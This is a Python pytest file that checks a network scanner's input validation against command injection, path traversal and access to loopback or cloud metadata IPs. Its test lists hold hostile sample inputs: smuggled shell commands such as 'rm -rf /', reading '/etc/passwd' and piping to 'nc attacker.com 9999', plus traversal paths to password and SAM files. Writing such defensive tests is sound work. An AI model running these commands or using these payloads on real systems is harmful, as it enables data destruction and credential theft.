"""
Security tests for injection protection.
Tests command injection, path traversal, and other injection vulnerabilities.
"""
import pytest
import ipaddress
from pathlib import Path

from app.scanner.network_scanner import validate_scan_target, is_sensitive_ip
from app.connector.device_manager import validate_device_ip
from app.report.generator import validate_report_path, check_disk_space


class TestNmapCommandInjection:
    """Test nmap command injection protections."""
    
    def test_shell_metacharacters_rejected(self):
        """Test that shell metacharacters are rejected."""
        malicious_inputs = [
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && cat /etc/passwd",
            "192.168.1.1 | nc attacker.com 9999",
            "192.168.1.1`whoami`",
            "192.168.1.1$(echo pwned)",
            "192.168.1.1 > /tmp/output",
            "192.168.1.1 < /etc/passwd",
        ]
        
        for malicious in malicious_inputs:
            is_valid, error = validate_scan_target(malicious)
            assert not is_valid, f"Should reject: {malicious}"
            assert "invalid characters" in error.lower()
    
    def test_overly_broad_cidr_rejected(self):
        """Test that overly broad CIDR ranges are rejected."""
        broad_cidrs = [
            "0.0.0.0/0",
            "0.0.0.0/1",
            "0.0.0.0/2",
            "0.0.0.0/3",
            "0.0.0.0/4",
            "192.168.0.0/8",  # Too broad
        ]
        
        for cidr in broad_cidrs:
            is_valid, error = validate_scan_target(cidr)
            assert not is_valid, f"Should reject: {cidr}"
            assert "too" in error.lower() or "not allowed" in error.lower()
    
    def test_cloud_metadata_ips_blocked(self):
        """Test that cloud metadata IPs are blocked."""
        metadata_ips = [
            "169.254.169.254",  # AWS/Azure metadata
            "169.254.169.253",  # AWS DNS
            "169.254.170.2",    # ECS metadata
        ]
        
        for ip in metadata_ips:
            is_sensitive, reason = is_sensitive_ip(ip)
            assert is_sensitive, f"Should block metadata IP: {ip}"
            assert "protected" in reason.lower()
    
    def test_loopback_blocked(self):
        """Test that loopback addresses are blocked."""
        loopback_ips = [
            "127.0.0.1",
            "127.0.0.53",
            "127.1.1.1",
        ]
        
        for ip in loopback_ips:
            is_sensitive, reason = is_sensitive_ip(ip)
            assert is_sensitive, f"Should block loopback: {ip}"
    
    def test_valid_targets_allowed(self):
        """Test that valid targets are allowed."""
        valid_targets = [
            "192.168.1.0/24",
            "192.168.1.1",
            "10.0.0.0/16",
            "172.16.0.0/20",
            "192.168.1.1-100",
        ]
        
        for target in valid_targets:
            is_valid, error = validate_scan_target(target)
            assert is_valid, f"Should allow: {target} (got error: {error})"


class TestSSHConnectionSecurity:
    """Test SSH connection security."""
    
    def test_sensitive_ips_blocked_for_ssh(self):
        """Test that sensitive IPs are blocked for SSH connections."""
        sensitive_ips = [
            "169.254.169.254",
            "127.0.0.1",
            "::1",
        ]
        
        for ip in sensitive_ips:
            is_valid, error = validate_device_ip(ip)
            assert not is_valid, f"Should block SSH to: {ip}"
            assert "protected" in error.lower() or "cannot connect" in error.lower()
    
    def test_valid_ips_allowed_for_ssh(self):
        """Test that valid IPs are allowed for SSH."""
        valid_ips = [
            "192.168.1.1",
            "10.0.0.5",
            "172.16.0.1",
        ]
        
        for ip in valid_ips:
            is_valid, error = validate_device_ip(ip)
            assert is_valid, f"Should allow SSH to: {ip} (got error: {error})"
    
    def test_invalid_ip_rejected(self):
        """Test that invalid IPs are rejected."""
        invalid_ips = [
            "",
            "not-an-ip",
            "999.999.999.999",
            "192.168.1",
        ]
        
        for ip in invalid_ips:
            is_valid, error = validate_device_ip(ip)
            assert not is_valid, f"Should reject invalid IP: {ip}"


class TestPathTraversalProtection:
    """Test path traversal protections."""
    
    def test_path_traversal_rejected(self):
        """Test that path traversal attempts are rejected."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "~/../../etc/shadow",
        ]
        
        for path in malicious_paths:
            with pytest.raises(ValueError):
                validate_report_path(path, allow_overwrite=True)
    
    def test_null_bytes_rejected(self):
        """Test that null bytes are rejected."""
        with pytest.raises(ValueError):
            validate_report_path("report\x00.txt", allow_overwrite=True)
    
    def test_valid_paths_allowed(self):
        """Test that valid paths are allowed."""
        # These should not raise exceptions
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            valid_paths = [
                f"{tmpdir}/report.md",
                f"{tmpdir}/subfolder/report.json",
                f"{tmpdir}/audit_report_2024.pdf",
            ]
            
            for path in valid_paths:
                # Just make sure it doesn't raise
                try:
                    result = validate_report_path(path, allow_overwrite=True)
                    assert isinstance(result, Path)
                except ValueError as e:
                    # Might fail due to disk space check, that's OK
                    pass


class TestDiskSpaceCheck:
    """Test disk space checking."""
    
    def test_disk_space_check_returns_tuple(self):
        """Test that disk space check returns correct format."""
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            has_space, message = check_disk_space(Path(tmpdir), required_bytes=1024)
            assert isinstance(has_space, bool)
            assert isinstance(message, str)
            # Should have space for 1KB
            assert has_space is True
    
    def test_disk_space_check_large_requirement(self):
        """Test with impossibly large space requirement."""
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            # Require 100TB
            has_space, message = check_disk_space(Path(tmpdir), required_bytes=100_000_000_000_000)
            assert has_space is False
            assert "insufficient" in message.lower() or "need" in message.lower()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
